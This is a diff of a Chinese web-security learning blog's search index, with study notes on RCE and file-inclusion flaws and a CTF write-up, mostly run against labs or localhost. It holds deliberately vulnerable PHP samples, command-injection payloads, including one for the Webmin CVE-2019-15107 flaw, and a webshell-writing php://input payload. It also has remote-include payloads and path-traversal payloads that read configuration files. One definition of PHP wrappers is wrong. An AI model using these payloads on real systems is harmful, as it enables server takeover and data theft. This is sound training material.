@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello！</title>
+    <url>/2026/05/19/hello-world/</url>
+    <content><![CDATA[欢迎来到我的博客！这是我的第一篇文章。
+关于我你好，我是 Jasmine_Iris。
+关于这个博客这里会记录我的学习、思考和分享。
+感谢你的来访 ~
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>数据库基础</title>
     <url>/2026/05/21/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[1. 数据库核心概念1.1 什么是数据库数据库是长期存储在计算机内、有组织、可共享的数据集合，解决海量数据管理问题（对比Excel：支持上亿条数据、多人同时操作且保证数据不混乱）。
@@ -467,407 +479,6 @@ Q9：CORS跨域漏洞是什么？CORS 跨域漏洞的产生原因是因为没有
       <tags>
         <tag>CSRF</tag>
         <tag>SSRF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RCE漏洞</title>
-    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、RCE简介与危害
-RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
-成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
-危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
-案例：
-
-
-远程代码执行（eval函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
-
-测试payload：
-
-http://localhost/1.php?x=phpinfo();
-http://localhost/1.php?x=echo%20abc;
-
-
-
-
-
-
-远程命令执行（system函数示例）
-
-&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
-
-测试payload
-
-http://localhost/2.php?x=ipconfig
-
-
-
-
-http://localhost/2.php?x=whoami
-
-
-二、墨者学院靶场https://mozhe.cn/
-案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
-
-
-
-页面输入127.0.0.1正常ping
-
-
-
-
-确认系统
-
-
-
-
-前端JS限制IP格式，前端过滤可绕过。
-
-
-
-
-Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
-
-
-
-
-查看返回目录：index.php、key_xxxx.php。
-
-
-
-
-最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
-
-
-
-
-注：命令分隔符有|、||、&amp;、&amp;&amp;、;
-
-案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
-
-
-
-
-
-解析代码，使⽤php
-
-注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
-&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
-
-新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
-
-
-PHP中内容反引号内内容会被当作系统shell命令执行。
-&lt;?phpecho `$_REQUEST[a]`;?&gt;
-
-
-payload1：?a=ls 列出当前目录，发现key文件。
-
-
-
-
-payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
-
-
-
-案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
-https://mozhe.cn/bug/detail/309
-(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
-
-漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
-(3) 操作
-
-
-
-
-
-
-
-
-
-
-登录拦截
-
-
-
-
-漏洞测试：利用数据包
-
-POST /password_change.cgi HTTP/1.1Host: 182.44.114.36:46542Cookie: redirect=1;testing=1; sid=x; sessiontest=1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflate, brDnt: 1Referer: https://182.44.114.36:46542/session_login.cgiContent-Type: application/x-www-form-urlencodedContent-Length: 62Connection: keep-aliveuser=rootxx&amp;pam=&amp;expired=2&amp;old=test|id&amp;new1=test2&amp;new2=test2
-
-Host: 靶机IP:端口	改成自己的
-常用 Payload
-
-old=test|id 执行id查看当前用户
-old=test|ls / 列出根目录文件
-old=test|cat /key.txt 读取根目录key
-
-
-
-
-获取 cookie
-
-
-
-
-
-
-
-案例4 PbootCMS代码执行漏洞
-
-(1) 漏洞分析漏洞成因：页面{pboot:if(eval($_POST[1]))}标签解析，POST参数1可控。
-审计⼯具查询危险函数：
-
-
-
-
-
-
-
-
-eval(&#x27;if(&#x27; . $matches[1][$i] . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;);
-
-(2) 操作
-在线留言
-
-
-
-AboutController ： &#123;pboot:if(eval($_POST[1]))&#125;!!!&#123;/pboot:if&#125;  
-
-
-
-
-
-
-
-
-登录后台：admin.php
-
-
-
-账号：admin 密码：1234556
-
-
-
-
-
-访问首页：http://localhost/pcms/index.php/about/10.html
-POST传参：1=phpinfo();，触发eval执行代码。
-
-
-
-
-三、RCE漏洞防御方案
-危险函数入参做严格黑名单&#x2F;白名单过滤，过滤| &amp; ; $ &gt; &lt;等命令拼接符号。
-尽量避免使用eval、system、exec、shell_exec、``反引号等高危执行函数。
-若业务必须使用命令执行函数，采用escapeshellarg&#x2F;escapeshellcmd对输入转义过滤。
-
-
-四、总结Q1：命令执行漏洞是什么？分别叫什么？remote command execution 远程命令执行
-remote code execution 远程代码执行
-Q2：命令执行漏洞的危害是什么？执行系统命令
-权限：一般情况下。RCE 漏洞的权限是 web 服务进程运行的权限（如 apache 进程权限 www-data）
-查看权限的命令
-Linux 查看权限：id
-Windows 查看权限：whoami &#x2F;all 或 whoami &#x2F;priv
-Q3：如何挖掘 RCE 漏洞？黑盒测试：除了 CTF、靶场以外，现实中无法通过黑盒挖掘命令执行漏洞，大部分都是靠扫描器（X-RAY），对于 RCE 漏洞都是只扫描历史漏洞
-Q4：如果给源代码，如何进行代审？通过找命令执行函数
-例如：
-
-system：执行系统命令，自带输出结果。
-shell_exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出。
-例如： echo shell_exec($cmd);
-
-
-exec：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，但只能输出最后一行。
-例如： echo exec($cmd);
-
-
-passthru：执行系统命令，自带输出结果。
-popen：执行系统命令，不会自动输出结果，需要把结果导出到文本文件中，在读取文本文件中保存好的命令执行结果。
-&#96;(反引号）：执行系统命令，不会自动输出结果，需要编写 echo 语句输出，和shell_exec 一致。
-
-Q5：RCE漏洞中，命令拼接符有哪些？&amp;&amp;		||	|	;（Windows 不支持）	&amp;
-Q6：如何反弹 shell？
-nc 反弹 shell
-bash 反弹 shell
-（Windows）powershell 反弹shell	Online - Reverse Shell Generator
-
-Q7：如何修复 RCE 漏洞？
-后端限制用户输入的内容格式，如输入 ip（验证用户输入的是不是 ip）
-php 自带函数（禁用）PHP: escapeshellarg - Manual
-在给源代码的情况下，找 PHP 配置中的 disable_functions&#x3D;shell_exec、system、exec、passthru、popen
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>RCE</category>
-      </categories>
-      <tags>
-        <tag>RCE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
-    <content><![CDATA[一、漏洞检测与危害1.概念
-文件包含：开发中用于复用代码；
-漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
-危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
-
-2.漏洞检测
-白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
-黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
-
-
-二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
-(1) 无后缀拼接限制服务端代码1.php
-&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
-
-新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
-
-txt文件被PHP解析执行。
-
-(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
-
-直接传1.txt会拼接成1.txt.html报错，两种绕过：
-①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
-
-原理：%00终止字符串，.html被舍弃。
-访问：http://localhost/include/upload2.php?filename=1.txt%00
-
-②超长路径截断
-原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
-?filename=1.txt......................................................................
-
-(3) 远程文件包含(RFI)
-可加载外网文件，危害更大
-前提：php.ini中allow_url_include = On
-
-①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
-②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
-
-方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
-方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
-
-
-三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
-
-
-
-协议
-PHP版本
-allow_url_fopen
-allow_url_include
-使用示例
-
-
-
-file:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
-
-
-php:&#x2F;&#x2F;filter
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
-
-
-php:&#x2F;&#x2F;input
-≥5.2
-off&#x2F;on
-on
-GET传参，POST写入PHP代码
-
-
-zip:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
-
-
-compress.bzip2:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
-
-
-compress.zlib:&#x2F;&#x2F;
-≥5.2
-off&#x2F;on
-off&#x2F;on
-?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
-
-
-data:&#x2F;&#x2F;
-≥5.2
-on
-on
-?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
-
-
-1、http&#x2F;https协议远程包含常规协议。
-(高亮的部分是伪协议）
-http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
-
-2、php:&#x2F;&#x2F;filter（读取源码，最常用）
-作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
-常用过滤器：convert.base64-encode
-示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
-附加过滤器分类：
-字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
-转换：convert.base64系列、quoted-printable
-压缩：bzip2、zlib
-加密：mdecrypt系列
-
-
-
-3、php:&#x2F;&#x2F;input（POST传入代码执行）
-原理：读取POST原始数据当做PHP代码执行
-示例：
-执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
-写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
-
-
-
-4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
-示例：
-读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
-
-
-
-5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
-?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
-
-
-四、不安全文件下载漏洞1. 原理
-本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
-核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
-
-2. Pikachu靶场实操
-下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
-利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
-
-
-五、补充文件下载与文件包含原理相近：
-
-文件包含：文件被PHP引擎执行
-文件下载：文件直接二进制输出下载到本地
-
-]]></content>
-      <categories>
-        <category>Web安全</category>
-        <category>文件包含</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1496,142 +1107,404 @@ Q5：怎么绕 WAF？挨个使用 audio、script、video、button标签、加密
       </tags>
   </entry>
   <entry>
-    <title>御网杯Web部分题解</title>
-    <url>/2026/06/13/%E9%A2%98%E8%A7%A3-%E5%BE%A1%E7%BD%91%E6%9D%AFWeb/index/</url>
-    <content><![CDATA[一、WEB-Snake_Game1. 题目
+    <title>文件包含漏洞</title>
+    <url>/2026/06/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、漏洞检测与危害1.概念
+文件包含：开发中用于复用代码；
+漏洞成因：可控参数未过滤，可引入外部文件当做PHP代码执行。
+危害：执行恶意图片木马、读取网站配置等敏感文件，造成源码泄露、服务器被控。
 
+2.漏洞检测
+白盒：代码审计查看include&#x2F;include_once&#x2F;require&#x2F;require_once参数是否可控
+黑盒：手工观察URL文件参数、漏洞扫描工具、公开POC测试
 
 
-2. 解题思路
-题目要求游戏得分要 300，我们可以直接修改前端代码，让初始分&gt;300
-F12
+二、本地包含 &amp; 远程文件包含1. 本地文件包含（LFI）仅读取服务器本地已有文件，常搭配文件上传使用
+(1) 无后缀拼接限制服务端代码1.php
+&lt;?php$filename=$_GET[&#x27;filename&#x27;];include ( $filename);?&gt;
 
+新建1.txt：&lt;?php phpinfo(); ?&gt;访问:http://localhost/include/upload.php?filename=1.txt
 
+txt文件被PHP解析执行。
 
+(2)服务端自动拼接后缀.html（upload2.php）&lt;?php$filename=$_GET[&#x27;filename&#x27;];include($filename.&quot;.html&quot;);?&gt;
 
-添加覆盖脚本
+直接传1.txt会拼接成1.txt.html报错，两种绕过：
+①%00截断（PHP&lt;5.3，magic_quotes_gpc关闭)
 
+原理：%00终止字符串，.html被舍弃。
+访问：http://localhost/include/upload2.php?filename=1.txt%00
 
+②超长路径截断
+原理：Windows文件名上限255字符、Linux4096字符，大量.填充耗尽路径，末尾.html被丢弃.
+?filename=1.txt......................................................................
 
-修改成功！
+(3) 远程文件包含(RFI)
+可加载外网文件，危害更大
+前提：php.ini中allow_url_include = On
 
+①无限制远程包含本地：?filename=http://192.168.0.13:88/1.txt远程1.txt内容&lt;?php phpinfo(); ?&gt;，远程代码被本地服务器执行。
+②服务拼接后缀.html绕过代码：include($filename.&quot;.html&quot;);
 
+方式1：?filename=http://192.168.0.13:88/1.txt?问号作为URL参数，.html变成无效参数被忽略
+方式2：?filename=http://192.168.0.13:88/1.txt%23%23是#，注释掉后面拼接的.html (%00 截断也可以）
 
-拿到 flag
 
+三、PHP常用伪协议PHP伪协议(PHP Protocol Override)是一种在PHP处理数据时，通过替换数据报的头部信息来欺骗网络协议的方式来提高性能的技术。
 
 
 
-二、WEB-PHP_Payment1. 题目
+协议
+PHP版本
+allow_url_fopen
+allow_url_include
+使用示例
 
-2. 解题思路
-根据题目提示知道可以用代金券拿到 Flag，但是我们的余额只有 10 金币，然后输入框里输入 base64 的代金券可以获得 Flag
 
 
+file:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;file:&#x2F;&#x2F;D&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt
 
 
-下载附件，收集信息
+php:&#x2F;&#x2F;filter
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.index.php
 
 
+php:&#x2F;&#x2F;input
+≥5.2
+off&#x2F;on
+on
+GET传参，POST写入PHP代码
 
-代码审计 apply_coupon.php
-1、包含了另外两个文件
 
+zip:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;zip:&#x2F;&#x2F;D&#x2F;xxx.zip&#x2F;23phpcode.txt
 
-2、从 POST 请求中取 coupon 参数，参数为空、解码失败会报错
 
+compress.bzip2:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.bzip2:&#x2F;&#x2F;xxx.bz2
 
-如果 base64 解码出来再反序列化解码后的字符串等于$promo 返回成功。此时 $promo 对象被销毁
-再看models.php 里的类
 
+compress.zlib:&#x2F;&#x2F;
+≥5.2
+off&#x2F;on
+off&#x2F;on
+?file&#x3D;compress.zlib:&#x2F;&#x2F;xxx.gz
 
-有两个属性，一是代金券金额，一是代金券码。
-含有魔术方法 __destruct()，对象销毁时触发：逻辑是，如果如果 promo_credit 属性存在且是数字，直接加到余额上。
-所以，目标就是，构造一个金额够买 Flag
-3、 构造 代金券
-&lt;?php  class PromoManager &#123;  public $promo_code = &quot;x&quot;;  public $promo_credit = 10000000;&#125;echo base64_encode(serialize(new PromoManager()));?&gt;
 
+data:&#x2F;&#x2F;
+≥5.2
+on
+on
+?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,
 
 
-TzoxMjoiUHJvbW9NYW5hZ2VyIjoyOntzOjEwOiJwcm9tb19jb2RlIjtzOjE6IngiO3M6MTI6InByb21vX2NyZWRpdCI7aToxMDAwMDAwMDt9
+1、http&#x2F;https协议远程包含常规协议。
+(高亮的部分是伪协议）
+http://localhost/include/upload.php?filename=http://192.168.0.13:88/1.txt
 
+2、php:&#x2F;&#x2F;filter（读取源码，最常用）
+作用：读取目标文件并编码输出，避免源码直接被浏览器解析。
+常用过滤器：convert.base64-encode
+示例 payload：http://localhost/include/upload.php?filename=php://filter/read=convert.base64-encode/resource=upload.php拿到base64字符串后解码得到源代码。
+附加过滤器分类：
+字符串：string.rot13、string.toupper、string.tolower、string.strip_tags
+转换：convert.base64系列、quoted-printable
+压缩：bzip2、zlib
+加密：mdecrypt系列
 
 
 
+3、php:&#x2F;&#x2F;input（POST传入代码执行）
+原理：读取POST原始数据当做PHP代码执行
+示例：
+执行系统命令verGET：?filename=php://inputPOST数据：&lt;?php system(&#39;ver&#39;);?&gt;
+写入一句话木马shell.phpGET：?filename=php://inputPOST：&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd]); ?&gt;&#39;); ?&gt;访问shell.php，POST cmd=phpinfo();即可连接蚁剑。
 
-购买 Flag，看 buy.php
 
 
+4、file:&#x2F;&#x2F;协议（读取本地绝对路径文件）
+示例：
+读取hosts：?filename=file:///C:\Windows\System32\drivers\etc\hosts
 
 
 
+5、data:&#x2F;&#x2F;协议（内嵌PHP代码执行）两种写法：
+?filename=data://text/plain,&lt;?php phpinfo();?&gt;?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
 
 
-用 POST 方式往 &#x2F;buy.php 传 item&#x3D;flag
+四、不安全文件下载漏洞1. 原理
+本质：受信越界，这是一种输入验证不严格导致的越界访问漏洞。正常情况下，应用只允许用户下载特定的目录（如&#x2F;uploads）下的公开资源，但由于程序直接信任了用户输入的路径或文件名，导致攻击者可以通过构造特殊的字符，跳出原本设定的储存边界，访问并下载服务器上任意可读的文件。
+核心机制：漏洞实现完全依赖于路径穿越（或目录跳转）。在操作系统中，..&#x2F;(Unix&#x2F;Linux)或..(Windows)代表返回上一级目录。当应用吧用户输入的参数直接拼接到服务器的文件查找路径中时，攻击者利用连续的..&#x2F;..&#x2F;..&#x2F;..&#x2F;,就可以一层一层脱离网站根目录，最终定位到系统的核心敏感文件。
 
+2. Pikachu靶场实操
+下载链接原地址：http://xxx/vul/unsafedownload/execdownload.php?filename=smallane.png
+利用目录穿越payload：http://xxx/vul/execdownload.php?filename=../../../inc/config.inc.php直接下载网站数据库配置等敏感源码。
 
-依据这个 调用 fetch
-fetch(&#x27;/buy.php&#x27;,&#123;method:&#x27;POST&#x27;,headers:&#123;&#x27;Content-Type&#x27;:&#x27;application/x-www-form-urlencoded&#x27;&#125;,body:&#x27;item=flag&#x27;&#125;).then(r=&gt;r.text()).then(console.log)
 
-拿到 flag
+五、补充文件下载与文件包含原理相近：
 
-
-
-
-
-三、WEB-Enterprise_OA1. 题目
-
-
-
-2. 解题思路
-根据题目提示，这题考查目录穿越、文件包含
-先尝试访问 flag.php
-
-
-
-include_path&#x3D;’.:&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php’
-路径分隔符是 :（冒号），Windows 用的是 ;。这是 Unix&#x2F;Linux 的特征。
-并且服务器是：
-
-
-说明可以用 &#x2F;etc&#x2F;passwd 来探测（因为&#x2F;etc&#x2F;passwd 一定存在、可读、内容可辨识）
-
-读源代码
-
-
-
-用 php 伪协议
-php://filter/read=convert.base64-encode/resource=index.php
-
-
-
-利用 base64 在线解密工具
-PD9waHAKJG1vZHVsZSA9IGlzc2V0KCRfR0VUWydtb2R1bGUnXSkgPyAkX0dFVFsnbW9kdWxlJ10gOiAncHVibGljX25vdGljZXMucGhwJzsKJG1vZHVsZSA9IHN0cl9yZXBsYWNlKCcuLi8nLCAnJywgJG1vZHVsZSk7Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KPGhlYWQ+CiAgICA8dGl0bGU+T0EgU3lzdGVtIFBvcnRhbDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7IGZvbnQtZmFtaWx5OiAnU2Vnb2UgVUknLCBUYWhvbWEsIEdlbmV2YSwgVmVyZGFuYSwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2YwZjJmNTsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW46IDA7IHBhZGRpbmc6IDA7fQogICAgICAgIC5oZWFkZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA0MDgwOyBjb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGZvbnQtc2l6ZTogMjRweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IH0KICAgICAgICAuY29udGFpbmVyIHsgYmFja2dyb3VuZC1jb2xvcjogd2hpdGU7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDhweDsgbWFyZ2luOiA0MHB4IGF1dG87IHdpZHRoOiA2MCU7IGJveC1zaGFkb3c6IDAgNHB4IDhweCByZ2JhKDAsMCwwLDAuMSk7IH0KICAgICAgICAubmF2IHsgbWFyZ2luLWJvdHRvbTogMzBweDsgYm9yZGVyLWJvdHRvbTogMnB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiAxMHB4OyB9CiAgICAgICAgLm5hdiBhIHsgbWFyZ2luOiAwIDE1cHg7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6ICMwMDQwODA7IGZvbnQtd2VpZ2h0OiBib2xkOyB9CiAgICAgICAgLm5hdiBhOmhvdmVyIHsgY29sb3I6ICMwMDY2Y2M7IH0KICAgICAgICAuY29udGVudCB7IHBhZGRpbmc6IDIwcHg7IHRleHQtYWxpZ246IGxlZnQ7IG1pbi1oZWlnaHQ6IDIwcHg7IGNvbG9yOiAjMzMzOyBsaW5lLWhlaWdodDogMS42OyB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPGRpdiBjbGFzcz0iaGVhZGVyIj4KICAgICAgICBFbnRlcnByaXNlIE9BIFN5c3RlbQogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9Im5hdiI+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9cHVibGljX25vdGljZXMucGhwIj5Ob3RpY2VzPC9hPgogICAgICAgICAgICA8YSBocmVmPSI/bW9kdWxlPWFib3V0LnBocCI+QWJvdXQgVXM8L2E+CiAgICAgICAgICAgIDxhIGhyZWY9Ij9tb2R1bGU9Y29udGFjdC5waHAiPkNvbnRhY3Q8L2E+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29udGVudCI+CiAgICAgICAgICAgIDw/cGhwIGluY2x1ZGUoJG1vZHVsZSk7ID8+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==
-
-
-
-
-访问绝对路径
-
-
-
-
-访问 flag 文件
-
-比如：flag.php   flag.txt
-
-
-
-
-
+文件包含：文件被PHP引擎执行
+文件下载：文件直接二进制输出下载到本地
 
 ]]></content>
       <categories>
-        <category>CTF-WP</category>
-        <category>比赛</category>
+        <category>Web安全</category>
+        <category>文件包含</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RCE漏洞</title>
+    <url>/2026/06/08/RCE%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、RCE简介与危害
+RCE：Remote Code&#x2F;Command Execution，分为远程代码执行、远程命令执行。
+成因：开发使用可执行代码&#x2F;系统命令的函数，函数入参用户可控且无过滤，触发漏洞。
+危害：攻击者直接在服务器执行系统指令，完全接管服务器权限。
+案例：
+
+
+远程代码执行（eval函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];eval($code);?&gt;
+
+测试payload：
+
+http://localhost/1.php?x=phpinfo();
+http://localhost/1.php?x=echo%20abc;
+
+
+
+
+
+
+远程命令执行（system函数示例）
+
+&lt;?php$code=$_GET[&#x27;x&#x27;];echo system($code);?&gt;
+
+测试payload
+
+http://localhost/2.php?x=ipconfig
+
+
+
+
+http://localhost/2.php?x=whoami
+
+
+二、墨者学院靶场https://mozhe.cn/
+案例1：Ping命令注入（靶场：https://mozhe.cn/bug/detail/12）
+
+
+
+页面输入127.0.0.1正常ping
+
+
+
+
+确认系统
+
+
+
+
+前端JS限制IP格式，前端过滤可绕过。
+
+
+
+
+Burp抓包修改POST参数：iipp=127.0.0.1|ls&amp;submit=Ping，|为命令拼接符，前命令执行完执行后续ls。
+
+
+
+
+查看返回目录：index.php、key_xxxx.php。
+
+
+
+
+最终payload：iipp=127.0.0.1|cat&lt;key_32507850714807.php&amp;submit=Ping，读取key值。
+
+
+
+
+注：命令分隔符有|、||、&amp;、&amp;&amp;、;
+
+案例2 PHP反引号命令执行（靶场：https://mozhe.cn/bug/detail/13）
+
+
+
+
+
+解析代码，使⽤php
+
+注意： PHP 要求字符串字面量必须用单引号（&#39;）或双引号（&quot;）括起来  
+&lt;?php   print(gzinflate(base64_decode(&quot;&amp;40pNzshXSFCJD3INDHUNDolOjE2wtlawt+MCAA==&amp;&quot;))); ?&gt;  
+
+新建一个 2.php 文件，把这段代码粘贴进去。再把文件放到 phpstudy 的网站根目录，访问。
+
+
+PHP中内容反引号内内容会被当作系统shell命令执行。
+&lt;?phpecho `$_REQUEST[a]`;?&gt;
+
+
+payload1：?a=ls 列出当前目录，发现key文件。
+
+
+
+
+payload2：?a=cat&lt;key_5358811711226.php 读取key内容。
+
+
+
+案例3 CVE-2019-15107 Webmin RCE漏洞(1) Webmin 介绍Webmin是用于管理类Unix系统的管理配置工具，拥有Web页面。该漏洞出现在password_change.cgi的密码重置功能处，因为缺少输入验证，恶意第三方可以传入恶意参数执行恶意代码。
+https://mozhe.cn/bug/detail/309
+(2) 部署sudo sucd /home/enjoy/vulhub-master/webmin/CVE-2019-15107/docker-compose builddocker-compose up -ddocker-compose down
+
+漏洞点：password_change.cgi密码重置页面参数可控，old参数可拼接系统命令。
+(3) 操作
+
+
+
+
+
+
+
+
+
+
+登录拦截
+
+
+
+
+漏洞测试：利用数据包
+
